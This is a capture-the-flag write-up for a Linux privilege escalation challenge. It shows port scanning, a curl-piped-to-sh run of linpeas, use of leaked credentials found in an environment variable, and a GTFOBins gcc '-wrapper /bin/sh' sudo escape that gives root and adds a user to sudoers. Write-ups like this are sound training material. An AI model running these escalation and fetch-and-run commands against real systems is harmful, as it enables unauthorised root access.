# CTF Writeup:  Bit by Bit

## Challenge Overview
* **Category:** Digital Forensics
* **Difficulty:** [Easy]
* **Description:** We have access to a linux box, need to find vulnerabile configuration to escalate privileges and find flag. 


## Tools Used

- [Linpease](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [gtfobins](https://gtfobins.github.io/)
- [bash]

---

## Solution

Usual disclaimer here: the following solution was the one that worked and there was some trial and error to find it. Omitting those dead-ends for brevity.  

### Step 1: Initial Access

```bash
ssh Pentester@<ip>

# no response
```

```bash
nmap -sV <ip>

#shows diff port
```

```bash
ssh -p 2222 Pentester@<ip>
```


Challenge requires privilege escalation so let's go script kiddie and fetch a tool to search for privilege escalations (`privesc` as it's call in `the biz`):

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

```

Under Environment we see `JOAN_TEMPORARY_CREDS=jojocreds1`

Well well well. For reasons mysterious there are temp creds for another user in our environment of our account. Let's try sshing into their account and see what permissions they have. Fingers crossed they're in sudoers and we can use their privesc ours **sinister laughing**. Which account though? 

```bash
ls /home/
# shows JOan 
```
Its probably the joan account. 

```bash

ssh joan@localhost
# no response
```

---

### Step 2: Priv Esc

Now we have access to joan's account, see what groups she's in

```bash
groups
Joan sudo
```

Cool, now let's add our pentester account to sudoers

```bash
sudo usermod -aG sudo Pentester
Sorry, user Joan is not allowed to execute '/usr/sbin/usermod -aG sudo Pentester' as root on dad5f987a15f."
```

Rubbing the brow here as I was heading for a PB for unfinished challenges in this event. Thankfully team-work makes the dream work and I looked to the east for a wizard saviour:

![image](https://github.com/user-attachments/assets/ae3a0073-47c4-4fd2-8951-ded3391ab218)

Lol, thanks wizard 🧙 10 seconds, one command, and a URL later: 

```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/gcc
```

[https://gtfobins.github.io/gtfobins/gcc#sudo]

Doopdeedoop:

```bash
gcc -wrapper /bin/sh,-s .
sudo usermod -aG sudo Pentester
exit
exit
# to log out the pentester. log back in
```


```bash
ssh -p 2222 Pentester@<ip>
```

```bash
groups
Pentester sudo
```

See what command we can run
```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/gcc
```

Run that again. 

---

### Step 3: Flag Retrieval

Now we have root, the flag's gotta be here somewhere, normally just use find (looking for flag.txt) or grep (looking for FLAG within a file) on the entire file system. 

```bash
find / -name flag.txt -type f
/root/flag.txt
cat /root/flag.txt
FLAG{7H15_SUDO_C00K3D_R007}
```

<iframe src="https://giphy.com/embed/lnlAifQdenMxW" width="480" height="274" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/football-night-fantasy-lnlAifQdenMxW">via GIPHY</a></p>


---

## Notes

- Don't be afraid to ask for help when you get blocked. Difficult for you can be easy for someone else and vice versa. 
- As a team, set up some tools in comms (like threads in channels) to share progress on challenges.
- Linpeas and gftobins are l337h4x0r

---


